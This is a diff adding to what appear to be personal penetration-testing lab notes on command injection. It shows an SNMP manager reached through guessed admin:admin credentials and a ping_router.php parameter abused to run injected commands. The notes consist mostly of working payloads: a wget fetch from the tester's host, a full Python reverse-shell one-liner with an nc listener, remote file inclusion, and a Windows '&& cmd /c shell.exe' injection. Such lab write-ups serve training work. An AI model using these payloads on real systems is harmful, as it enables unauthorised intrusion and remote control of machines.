@@ -341,6 +341,7 @@ http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
 
 ### Command Injection
 #### DNS Querying Service
+##### windows
 For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
 ````
 && whoami
@@ -355,6 +356,28 @@ python3 -m http.server 80
 nc -nlvp 80
 && cmd /c C:\\Windows\\temp\\shell.exe
 ````
+#### snmp manager
+##### linux
+````
+For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
+````
+````
+10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
+````
+````
+10.1.1.95:4080/ping_router.php?cmd=$myip
+tcpdump -i tun0 icmp
+````
+````
+10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
+python3 -m http.server 8000
+tcpdump -i tun0 icmp
+````
+````
+10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+nc -nlvp 22
+````
+
 ### SQL Injection
 Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
 #### Research Repo MariaDB
